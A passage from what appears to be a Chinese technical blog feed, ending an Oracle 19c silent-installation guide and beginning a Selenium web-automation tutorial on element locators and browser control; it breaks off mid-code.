dba,asmdba,backupdba,dgdba,kmdba,racdba,oper -m oracle</code></pre></div><p>配置系统内核参数</p><p>vim &#x2F;etc&#x2F;sysctl.conf</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">fs.aio-max-nr</span> = <span class="hljs-number">1048576</span><span class="hljs-attr">fs.file-max</span> = <span class="hljs-number">6815744</span><span class="hljs-attr">kernel.shmall</span> = <span class="hljs-number">16451328</span><span class="hljs-attr">kernel.shmmax</span> = <span class="hljs-number">33692319744</span><span class="hljs-attr">kernel.shmmni</span> = <span class="hljs-number">4096</span><span class="hljs-attr">kernel.sem</span> = <span class="hljs-number">250</span> <span class="hljs-number">32000</span> <span class="hljs-number">100</span> <span class="hljs-number">128</span><span class="hljs-attr">net.ipv4.ip_local_port_range</span> = <span class="hljs-number">9000</span> <span class="hljs-number">65500</span><span class="hljs-attr">net.core.rmem_default</span> = <span class="hljs-number">262144</span><span class="hljs-attr">net.core.rmem_max</span> = <span class="hljs-number">4194304</span><span class="hljs-attr">net.core.wmem_default</span> = <span class="hljs-number">262144</span><span class="hljs-attr">net.core.wmem_max</span> = <span class="hljs-number">1048576</span></code></pre></div><p>sysctl -p</p><p>配置用户环境变量</p><div class="code-wrapper"><pre><code class="hljs routeros">su - oraclevim .bash_profile=======<span class="hljs-built_in">export</span> <span class="hljs-attribute">NLS_LANG</span>=AMERICAN_AMERICA.ZHS16GBK<span class="hljs-built_in">export</span> <span class="hljs-attribute">ORACLE_BASE</span>=/u01/app/oracle<span class="hljs-built_in">export</span> <span class="hljs-attribute">ORACLE_HOME</span>=/u01/app/oracle/product/19.3.0<span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:$ORACLE_HOME/bin:/usr/local/bin<span class="hljs-built_in">export</span> <span class="hljs-attribute">ORACLE_HOSTNAME</span>=db<span class="hljs-built_in">export</span> <span class="hljs-attribute">ORACLE_SID</span>=orcl<span class="hljs-built_in">export</span> <span class="hljs-attribute">LD_LIBRARY_PATH</span>=<span class="hljs-variable">$ORACLE_HOME</span>/lib:$ORACLE_HOME/rdbms/lib:$ORACLE_HOME/network/lib:/lib:/usr/lib<span class="hljs-built_in">export</span> <span class="hljs-attribute">CLASSPATH</span>=<span class="hljs-variable">$ORACLE_HOME</span>/jlib:$ORACLE_HOME/rdbms/jlib:$ORACLE_HOME/network/jlib</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /u01<span class="hljs-built_in">chmod</span> 777 /u01</code></pre></div><p>vim &#x2F;etc&#x2F;security&#x2F;limits.conf</p><div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">oracle </span>soft core unlimited<span class="hljs-keyword">oracle </span>hard core unlimited<span class="hljs-keyword">oracle </span>soft nofile <span class="hljs-number">10240</span><span class="hljs-keyword">oracle </span>hard nofile <span class="hljs-number">65536</span><span class="hljs-keyword">oracle </span>soft nproc <span class="hljs-number">16384</span><span class="hljs-keyword">oracle </span>hard nproc <span class="hljs-number">16384</span><span class="hljs-keyword">oracle </span>soft stack <span class="hljs-number">10240</span><span class="hljs-keyword">oracle </span>hard stack <span class="hljs-number">32768</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /u01/app/oracle/product/19.3.0<span class="hljs-built_in">mkdir</span> /u01/app/oraInventory<span class="hljs-built_in">chown</span> -R oracle:oinstall /u01/app/oracle<span class="hljs-built_in">chown</span> -R oracle:oinstall /u01/app/oraInventory</code></pre></div><div class="code-wrapper"><pre><code class="hljs routeros">cp /u01/app/oracle/product/19.3.0/install/response/db_install.rsp /u01/app/oracle/product/19.3.0/install/response/db_install.rsp.bakvim /u01/app/oracle/product/19.3.0/install/response/db_install.rsp=====oracle.install.<span class="hljs-attribute">option</span>=INSTALL_DB_SWONLY<span class="hljs-attribute">UNIX_GROUP_NAME</span>=oinstall<span class="hljs-attribute">INVENTORY_LOCATION</span>=/u01/app/oraInventory<span class="hljs-attribute">ORACLE_HOME</span>=/u01/app/oracle/product/19.3.0<span class="hljs-attribute">ORACLE_BASE</span>=/u01/app/oracleoracle.install.db.<span class="hljs-attribute">InstallEdition</span>=EEoracle.install.db.<span class="hljs-attribute">OSDBA_GROUP</span>=dbaoracle.install.db.<span class="hljs-attribute">OSOPER_GROUP</span>=operoracle.install.db.<span class="hljs-attribute">OSBACKUPDBA_GROUP</span>=backupdbaoracle.install.db.<span class="hljs-attribute">OSDGDBA_GROUP</span>=dgdbaoracle.install.db.<span class="hljs-attribute">OSKMDBA_GROUP</span>=kmdbaoracle.install.db.<span class="hljs-attribute">OSRACDBA_GROUP</span>=racdbaoracle.install.db.rootconfig.<span class="hljs-attribute">executeRootScript</span>=<span class="hljs-literal">false</span></code></pre></div><p>执行安装</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /u01/app/oracle/product/19.3.0./runInstaller -silent -responseFile /u01/app/oracle/product/19.3.0/install/response/db_install.rsp</code></pre></div><p>根据提示使用root用户执行两个脚本</p><div class="code-wrapper"><pre><code class="hljs bash">sh /u01/app/oraInventory/orainstRoot.shsh /u01/app/oracle/product/19.3.0/root.sh</code></pre></div><div class="code-wrapper"><pre><code class="hljs abnf">vim /u01/app/oracle/product/<span class="hljs-number">19.3</span>.<span class="hljs-number">0</span>/network/admin/listener.ora<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-attribute">LISTENER</span> <span class="hljs-operator">=</span>  (DESCRIPTION_LIST <span class="hljs-operator">=</span>    (DESCRIPTION <span class="hljs-operator">=</span>      (ADDRESS <span class="hljs-operator">=</span> (PROTOCOL <span class="hljs-operator">=</span> TCP)(HOST <span class="hljs-operator">=</span> <span class="hljs-number">10.58</span>.<span class="hljs-number">120.200</span>)(PORT <span class="hljs-operator">=</span> <span class="hljs-number">1521</span>))      (ADDRESS <span class="hljs-operator">=</span> (PROTOCOL <span class="hljs-operator">=</span> IPC)(KEY <span class="hljs-operator">=</span> EXTPROC1521))    )  )<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span></code></pre></div><p>netca &#x2F;silent &#x2F;responseFile &#x2F;u01&#x2F;app&#x2F;oracle&#x2F;product&#x2F;19.3.0&#x2F;assistants&#x2F;netca&#x2F;netca.rsp</p><div class="code-wrapper"><pre><code class="hljs abnf">cp /u01/app/oracle/product/<span class="hljs-number">19.3</span>.<span class="hljs-number">0</span>/assistants/dbca/dbca.rsp /u01/app/oracle/product/<span class="hljs-number">19.3</span>.<span class="hljs-number">0</span>/assistants/dbca/dbca.rsp.bakvim /u01/app/oracle/product/<span class="hljs-number">19.3</span>.<span class="hljs-number">0</span>/assistants/dbca/dbca.rsp<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-attribute">gdbName</span><span class="hljs-operator">=</span>orcl<span class="hljs-attribute">sid</span><span class="hljs-operator">=</span>orcl<span class="hljs-attribute">databaseConfigType</span><span class="hljs-operator">=</span>SI<span class="hljs-attribute">templateName</span><span class="hljs-operator">=</span>General_Purpose.dbc<span class="hljs-attribute">sysPassword</span><span class="hljs-operator">=</span>&lt;password&gt;<span class="hljs-attribute">systemPassword</span><span class="hljs-operator">=</span>&lt;passowrd&gt;<span class="hljs-attribute">emConfiguration</span><span class="hljs-operator">=</span>DBEXPRESS<span class="hljs-attribute">dbsnmpPassword</span><span class="hljs-operator">=</span>&lt;password&gt;<span class="hljs-attribute">datafileDestination</span><span class="hljs-operator">=/</span>u01/app/oracle/oradata<span class="hljs-attribute">characterSet</span><span class="hljs-operator">=</span>ZHS16GBK<span class="hljs-attribute">totalMemory</span><span class="hljs-operator">=</span><span class="hljs-number">6144</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span></code></pre></div><p>创建数据库</p><p>相应模板存放位置</p><ol><li>软件&#x2F;u01&#x2F;app&#x2F;oracle&#x2F;product&#x2F;19.5.0&#x2F;install&#x2F;response&#x2F;db_install.rsp</li><li>监听&#x2F;u01&#x2F;app&#x2F;oracle&#x2F;product&#x2F;19.5.0&#x2F;assistants&#x2F;netca&#x2F;netca.rsp</li><li>建库&#x2F;u01&#x2F;app&#x2F;oracle&#x2F;product&#x2F;19.5.0&#x2F;assistants&#x2F;dbca&#x2F;dbca.rsp</li></ol><div class="code-wrapper"><pre><code class="hljs awk">dbca -silent -createDatabase -responseFile <span class="hljs-regexp">/u01/</span>app<span class="hljs-regexp">/oracle/</span>product<span class="hljs-regexp">/19.3.0/</span>assistants<span class="hljs-regexp">/dbca/</span>dbca.rsp</code></pre></div><p>sqlplus &#x2F;nolog</p><p>conn sys&#x2F;oracle as sysdba</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/bjmt_08/article/details/125561013">https://blog.csdn.net/bjmt_08/article/details/125561013</a></p>]]></content>
    
    
    <categories>
      
      <category>软件安装</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Database</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Selenium教程</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Python/Selenium%E6%95%99%E7%A8%8B/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Python/Selenium%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="Selenium教程"><a href="#Selenium教程" class="headerlink" title="Selenium教程"></a>Selenium教程</h1><style>  table {    border-collapse: collapse;    width: 100%;    border: 1px solid black;  }  th, td {    border: 1px solid black;    padding: 8px;    text-align: center;  }</style><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a><font color="orange">简介</font></h2><p>Selenium 是最广泛使用的开源 Web UI（用户界面）自动化测试套件之一。Selenium 支持的语言包括C#，Java，Perl，PHP，Python 和 Ruby。目前，Selenium Web 驱动程序最受 Python 和 C＃欢迎。 Selenium 测试脚本可以使用任何支持的编程语言进行编码，并且可以直接在大多数现代 Web 浏览器中运行。在爬虫领域 selenium 同样是一把利器，能够解决大部分的网页的反爬问题，但也不是万能的，它最明显的缺点就是速度慢。下面就进入正式的 study 阶段。</p><hr><h2 id="Selenium安装"><a href="#Selenium安装" class="headerlink" title="Selenium安装"></a><font color="orange">Selenium安装</font></h2><p>打开 cmd，输入下面命令进行安装。</p><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">pip</span> install -i https://pypi.douban.com/simple selenium</code></pre></div><p>执行后，使用 <code>pip show selenium</code> 查看是否安装成功。</p><hr><h2 id="安装浏览器驱动"><a href="#安装浏览器驱动" class="headerlink" title="安装浏览器驱动"></a><font color="orange">安装浏览器驱动</font></h2><p>针对不同的浏览器，需要安装不同的驱动。这里以安装 <code>Chrome</code> 驱动作为演示。但 <code>Chrome</code> 在用 <code>selenium</code> 进行自动化测试时还是有部分 <code>bug</code> ，常规使用没什么问题，但如果出现一些很少见的报错，可以使用 <code>Firefox</code> 进行尝试。</p><p>访问<code>https://googlechromelabs.github.io/chrome-for-testing/#stable</code></p><p>根据操作系统下载版本相同的<code>chrome</code>和<code>chromedriver</code>。</p><h3 id="下载浏览器"><a href="#下载浏览器" class="headerlink" title="下载浏览器"></a>下载浏览器</h3><p><a href="https://storage.googleapis.com/chrome-for-testing-public/125.0.6422.60/win64/chrome-win64.zip">https://storage.googleapis.com/chrome-for-testing-public/125.0.6422.60/win64/chrome-win64.zip</a></p><h3 id="下载驱动"><a href="#下载驱动" class="headerlink" title="下载驱动"></a>下载驱动</h3><p><a href="https://storage.googleapis.com/chrome-for-testing-public/125.0.6422.60/win64/chromedriver-win64.zip">https://storage.googleapis.com/chrome-for-testing-public/125.0.6422.60/win64/chromedriver-win64.zip</a></p><p> 下载完成后，压缩包内只有一个 <code>exe</code> 文件。 <img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/9dc8b4504b6e472aafd57a189a76c2c2.png"> 将 <code>chromedriver.exe</code> 放至任意路径，再把其路径添加到环境变量<code>Path</code>中。</p><hr><h2 id="定位页面元素"><a href="#定位页面元素" class="headerlink" title="定位页面元素"></a><font color="orange">定位页面元素</font></h2><h3 id="打开指定页面"><a href="#打开指定页面" class="headerlink" title="打开指定页面"></a>打开指定页面</h3><p>使用 <code>selenium</code> 定位页面元素的前提是你已经了解基本的页面布局及各种标签含义，当然如果之前没有接触过，现在我也可以带你简单的了解一下。</p><p> 以我们熟知的 CSDN 为例，我们进入首页，按 <strong>【F12】</strong> 进入开发者工具。红框中显示的就是页面的代码，我们要做的就是从代码中定位获取我们需要的元素。 <img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/735a00dcc4b04f529a7f88459e1e75b3.png"><br/> 想要定位并获取页面中的信息，首先要使用 <code>webdriver</code> 打开指定页面，再去定位。</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> selenium import webdriver<span class="hljs-comment"># Chrome浏览器</span>driver = webdriver.Chrome()driver.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;https://www.csdn.net/&#x27;</span>)</code></pre></div><p>执行上面语句后会发现，浏览器打开 CSDN 主页后会马上关闭，想要防止浏览器自动关闭，可以添加下面代码。</p><div class="code-wrapper"><pre><code class="hljs cmake"><span class="hljs-comment"># 不自动关闭浏览器</span><span class="hljs-keyword">option</span> = webdriver.ChromeOptions()<span class="hljs-keyword">option</span>.add_experimental_option(<span class="hljs-string">&quot;detach&quot;</span>, <span class="hljs-keyword">True</span>)<span class="hljs-comment"># 将option作为参数添加到Chrome中</span>driver = webdriver.Chrome(chrome_options=<span class="hljs-keyword">option</span>)</code></pre></div><p>这样将上面的代码组合再打开浏览器就不会自动关闭了。</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> selenium import webdriver<span class="hljs-comment"># 不自动关闭浏览器</span>option = webdriver.ChromeOptions()option.add_experimental_option(<span class="hljs-string">&quot;detach&quot;</span>, <span class="hljs-literal">True</span>)<span class="hljs-comment"># 注意此处添加了chrome_options参数</span>driver = webdriver.Chrome(<span class="hljs-attribute">chrome_options</span>=option)driver.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;https://www.csdn.net/&#x27;</span>)</code></pre></div><p>下面我们再来看看几种常见的页面元素定位方式。</p><h3 id="id-定位"><a href="#id-定位" class="headerlink" title="id 定位"></a>id 定位</h3><p>标签的 <code>id</code> 具有唯一性，就像人的身份证，假设有个 <code>input</code> 标签如下。</p><div class="code-wrapper"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;toolbar-search-input&quot;</span> <span class="hljs-attribute">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">placeholder</span>=<span class="hljs-string">&quot;C++难在哪里？&quot;</span>&gt;</code></pre></div><p>我们可以通过 <code>id</code> 定位到它，由于 <code>id</code> 的唯一性，我们可以不用管其他的标签的内容。</p><div class="code-wrapper"><pre><code class="hljs ceylon">driver.find<span class="hljs-number">_</span>element<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_</span>id(<span class="hljs-string">&quot;toolbar-search-input&quot;</span>)</code></pre></div><h3 id="name-定位"><a href="#name-定位" class="headerlink" title="name 定位"></a>name 定位</h3><p><code>name</code> 指定标签的名称，在页面中可以不唯一。假设有个 <code>meta</code> 标签如下</p><div class="code-wrapper"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;keywords&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;CSDN博客,CSDN学院,CSDN论坛,CSDN直播&quot;</span>&gt;</code></pre></div><p>我们可以使用 <code>find_element_by_name</code> 定位到 <code>meta</code> 标签。</p><div class="code-wrapper"><pre><code class="hljs ceylon">driver.find<span class="hljs-number">_</span>element<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_n</span>ame(<span class="hljs-string">&quot;keywords&quot;</span>)</code></pre></div><h3 id="class-定位"><a href="#class-定位" class="headerlink" title="class 定位"></a>class 定位</h3><p><code>class</code> 指定标签的类名，在页面中可以不唯一。假设有个 <code>div</code> 标签如下</p><div class="code-wrapper"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;toolbar-search-container&quot;</span>&gt;</code></pre></div><p>我们可以使用 <code>find_element_by_class_name</code> 定位到 <code>div</code> 标签。</p><div class="code-wrapper"><pre><code class="hljs ceylon">driver.find<span class="hljs-number">_</span>element<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_</span><span class="hljs-keyword">class</span><span class="hljs-number">_n</span>ame(<span class="hljs-string">&quot;toolbar-search-container&quot;</span>)</code></pre></div><h3 id="tag-定位"><a href="#tag-定位" class="headerlink" title="tag 定位"></a>tag 定位</h3><p>每个 <code>tag</code> 往往用来定义一类功能，所以通过 <code>tag</code> 来识别某个元素的成功率很低，每个页面一般都用很多相同的 <code>tag</code> ，比如：<code>&lt;div&gt;</code>、<code>&lt;input&gt;</code> 等。这里还是用上面的 <code>div</code> 作为例子。</p><div class="code-wrapper"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;toolbar-search-container&quot;</span>&gt;</code></pre></div><p>我们可以使用 <code>find_element_by_class_name</code> 定位到 <code>div</code> 标签。</p><div class="code-wrapper"><pre><code class="hljs ceylon">driver.find<span class="hljs-number">_</span>element<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_</span>tag<span class="hljs-number">_n</span>ame(<span class="hljs-string">&quot;div&quot;</span>)</code></pre></div><h3 id="xpath-定位"><a href="#xpath-定位" class="headerlink" title="xpath 定位"></a>xpath 定位</h3><p><code>xpath</code> 是一种在 <code>XML</code> 文档中定位元素的语言，它拥有多种定位方式，下面通过实例我们看一下它的几种使用方式。</p><div class="code-wrapper"><pre><code class="hljs routeros">&lt;html&gt;  &lt;head&gt;<span class="hljs-built_in">..</span>.&lt;head/&gt;  &lt;body&gt;    &lt;div <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;csdn-toolbar&quot;</span>&gt;      &lt;div <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;toolbar-inside&quot;</span>&gt;        &lt;div <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;toolbar-container&quot;</span>&gt;          &lt;div <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;toolbar-container-left&quot;</span>&gt;...&lt;/div&gt;          &lt;div <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;toolbar-container-middle&quot;</span>&gt;            &lt;div <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;toolbar-search onlySearch&quot;</span>&gt;&lt;div <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;toolbar-search-container&quot;</span>&gt;&lt;input <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;toolbar-search-input&quot;</span> <span class="hljs-attribute">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">placeholder</span>=<span class="hljs-string">&quot;C++难在哪里？&quot;</span>&gt;</code></pre></div><p>根据上面的标签需要定位 最后一行 <code>input</code> 标签，以下列出了四种方式，<code>xpath</code> 定位的方式多样并不唯一，使用时根据情况进行解析即可。</p><div class="code-wrapper"><pre><code class="hljs perl"><span class="hljs-comment"># 绝对路径（层级关系）定位</span>driver.find_element_by_xpath(<span class="hljs-string">&quot;/html/body/div/div/div/div[2]/div/div/input[1]&quot;</span>)<span class="hljs-comment"># 利用元素属性定位</span>driver.find_element_by_xpath(<span class="hljs-string">&quot;//*[<span class="hljs-variable">@id</span>=&#x27;toolbar-search-input&#x27;]&quot;</span>))<span class="hljs-comment"># 层级+元素属性定位</span>driver.find_element_by_xpath(<span class="hljs-string">&quot;//div[<span class="hljs-variable">@id</span>=&#x27;csdn-toolbar&#x27;]/div/div/div[2]/div/div/input[1]&quot;</span>)<span class="hljs-comment"># 逻辑运算符定位</span>driver.find_element_by_xpath(<span class="hljs-string">&quot;//*[<span class="hljs-variable">@id</span>=&#x27;toolbar-search-input&#x27; and <span class="hljs-variable">@autocomplete</span>=&#x27;off&#x27;]&quot;</span>)</code></pre></div><h3 id="css-定位"><a href="#css-定位" class="headerlink" title="css 定位"></a>css 定位</h3><p><code>CSS</code> 使用选择器来为页面元素绑定属性，它可以较为灵活的选择控件的任意属性，一般定位速度比 <code>xpath</code> 要快，但使用起来略有难度。<br/> <code>CSS</code> 选择器常见语法：</p><table><thead><tr><th align="center">方法</th><th align="center">例子</th><th align="center">描述</th></tr></thead><tbody><tr><td>.class</td><td>.toolbar-search-container</td><td>选择 class = 'toolbar-search-container' 的所有元素</td></tr><tr><td>#id</td><td>#toolbar-search-input</td><td>选择 id = 'toolbar-search-input' 的元素</td></tr><tr><td>*</td><td>*</td><td>选择所有元素</td></tr><tr><td>element</td><td>input</td><td>选择所有 &lt;input&gt; 元素</td></tr><tr><td>element&gt;element</td><td>div&gt;input</td><td>选择父元素为 &lt;div&gt; 的所有 &lt;input&gt; 元素</td></tr><tr><td>element+element</td><td>div+input</td><td>选择同一级中在 &lt;div&gt; 之后的所有 &lt;input&gt; 元素</td></tr><tr><td>[attribute=value]</td><td>type='text'</td><td>选择 type = 'text' 的所有元素</td></tr></tbody></table><p>举个简单的例子，同样定位上面实例中的 <code>input</code> 标签。</p><div class="code-wrapper"><pre><code class="hljs applescript">driver.find_element_by_css_selector(&#x27;<span class="hljs-comment">#toolbar-search-input&#x27;)</span>driver.find_element_by_css_selector(&#x27;html&gt;body&gt;<span class="hljs-keyword">div</span>&gt;<span class="hljs-keyword">div</span>&gt;<span class="hljs-keyword">div</span>&gt;<span class="hljs-keyword">div</span>&gt;<span class="hljs-keyword">div</span>&gt;<span class="hljs-keyword">div</span>&gt;input&#x27;)</code></pre></div><h3 id="link-定位"><a href="#link-定位" class="headerlink" title="link 定位"></a>link 定位</h3><p><code>link</code> 专门用来定位文本链接，假如要定位下面这一标签。</p><div class="code-wrapper"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;practice-box&quot;</span> data-v<span class="hljs-number">-04</span>f46969=<span class="hljs-string">&quot;&quot;</span>&gt;加入！每日一练&lt;/<span class="hljs-keyword">div</span>&gt;</code></pre></div><p>我们使用 <code>find_element_by_link_text</code> 并指明标签内全部文本即可定位。</p><div class="code-wrapper"><pre><code class="hljs ceylon">driver.find<span class="hljs-number">_</span>element<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_</span>link<span class="hljs-number">_</span>text(<span class="hljs-string">&quot;加入！每日一练&quot;</span>)</code></pre></div><h3 id="partial-link-定位"><a href="#partial-link-定位" class="headerlink" title="partial_link 定位"></a>partial_link 定位</h3><p><code>partial_link</code> 翻译过来就是“部分链接”，对于有些文本很长，这时候就可以只指定部分文本即可定位，同样使用刚才的例子。</p><div class="code-wrapper"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;practice-box&quot;</span> data-v<span class="hljs-number">-04</span>f46969=<span class="hljs-string">&quot;&quot;</span>&gt;加入！每日一练&lt;/<span class="hljs-keyword">div</span>&gt;</code></pre></div><p>我们使用 <code>find_element_by_partial_link_text</code> 并指明标签内部分文本进行定位。</p><div class="code-wrapper"><pre><code class="hljs ceylon">driver.find<span class="hljs-number">_</span>element<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_p</span>artial<span class="hljs-number">_</span>link<span class="hljs-number">_</span>text(<span class="hljs-string">&quot;加入&quot;</span>)</code></pre></div><hr><h2 id="浏览器控制"><a href="#浏览器控制" class="headerlink" title="浏览器控制"></a><font color="orange">浏览器控制</font></h2><h3 id="修改浏览器窗口大小"><a href="#修改浏览器窗口大小" class="headerlink" title="修改浏览器窗口大小"></a>修改浏览器窗口大小</h3><p><code>webdriver</code> 提供 <code>set_window_size()</code> 方法来修改浏览器窗口的大小。</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> selenium import webdriver<span class="hljs-comment"># Chrome浏览器</span>driver = webdriver.Chrome()driver.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;https://www.csdn.net/&#x27;</span>)<span class="hljs-comment"># 设置浏览器浏览器的宽高为：600x800</span>driver.set_window_size(600, 800)</code></pre></div><p>也可以使用 <code>maximize_window()</code> 方法可以实现浏览器全屏显示。</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> selenium import webdriver<span class="hljs-comment"># Chrome浏览器</span>driver = webdriver.Chrome()driver.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;https://www.csdn.net/&#x27;</span>)<span class="hljs-comment"># 设置浏览器浏览器的宽高为：600x800</span>driver.maximize_window()</code></pre></div><h3 id="浏览器前进-后退"><a href="#浏览器前进-后退" class="headerlink" title="浏览器前进&amp;后退"></a>浏览器前进&amp;后退</h3><p><code>webdriver</code> 提供 <code>back</code> 和 <code>forward</code> 方法来实现页面的后退与前进。下面我们 ①进入CSDN首页，②打开CSDN个人主页，③<code>back</code> 返回到CSDN首页，④ <code>forward</code> 前进到个人主页。</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> selenium import webdriver<span class="hljs-keyword">from</span> time import sleepdriver = webdriver.Chrome()<span class="hljs-comment"># 访问CSDN首页</span>driver.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;https://www.csdn.net/&#x27;</span>)sleep(2)<span class="hljs-comment">#访问CSDN个人主页</span>driver.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;https://blog.csdn.net/qq_43965708&#x27;</span>)sleep(2)<span class="hljs-comment">#返回（后退）到CSDN首页</span>driver.back()sleep(2)<span class="hljs-comment">#前进到个人主页</span>driver.forward()</code></pre></div><p>细心的读者会发现第二次 <code>get()</code> 打开新页面时，会在原来的页面打开，而不是在新标签中打开。如果想的话也可以在新的标签页中打开新的链接，但需要更改一下代码，执行 <code>js</code> 语句来打开新的标签。</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-comment"># 在原页面打开</span>driver.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;https://blog.csdn.net/qq_43965708&#x27;</span>)<span class="hljs-comment"># 新标签中打开</span>js = <span class="hljs-string">&quot;window.open(&#x27;https://blog.csdn.net/qq_43965708&#x27;)&quot;</span>driver.execute_script(js)</code></pre></div><h3 id="浏览器刷新"><a href="#浏览器刷新" class="headerlink" title="浏览器刷新"></a>浏览器刷新</h3><p>在一些特殊情况下我们可能需要刷新页面来获取最新的页面数据，这时我们可以使用 <code>refresh()</code> 来刷新当前页面。</p><div class="code-wrapper"><pre><code class="hljs 1c"><span class="hljs-meta"># 刷新页面</span>driver.refresh<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span></code></pre></div><h3 id="浏览器窗口切换"><a href="#浏览器窗口切换" class="headerlink" title="浏览器窗口切换"></a>浏览器窗口切换</h3><p>在很多时候我们都需要用到窗口切换，比如：当我们点击注册按钮时，它一般会打开一个新的标签页，但实际上代码并没有切换到最新页面中，这时你如果要定位注册页面的标签就会发现定位不到，这时就需要将实际窗口切换到最新打开的那个窗口。我们先获取当前各个窗口的句柄，这些信息的保存顺序是按照<strong>时间</strong>来的，最新打开的窗口放在数组的<strong>末尾</strong>，这时我们就可以定位到最新打开的那个窗口了。</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># 获取打开的多个窗口句柄</span><span class="hljs-attribute">windows</span> = driver.window_handles<span class="hljs-comment"># 切换到当前最新打开的窗口</span><span class="hljs-attribute">driver</span>.switch_to.window(windows[-<span class="hljs-number">1</span>])</code></pre></div><h3 id="常见操作"><a href="#常见操作" class="headerlink" title="常见操作"></a>常见操作</h3><p>webdriver中的常见操作有：</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>send_keys()</td><td>模拟输入指定内容</td></tr><tr><td>clear()</td><td>清除文本内容</td></tr><tr><td>is_displayed()</td><td>判断该元素是否可见</td></tr><tr><td>get_attribute()</td><td>获取标签属性值</td></tr><tr><td>size</td><td>返回元素的尺寸</td></tr><tr><td>text</td><td>返回元素文本</td></tr></tbody></table><p>接下来还是用 CSDN 首页为例，需要用到的就是搜素框和搜索按钮。通过下面的例子就可以气息的了解各个操作的用法了。<br/> <img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/9dc1e74f9cdf4fc99463d98737520104.png"></p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriverdriver = webdriver.Chrome()driver.get(<span class="hljs-string">&#x27;https://www.csdn.net/&#x27;</span>)sleep(<span 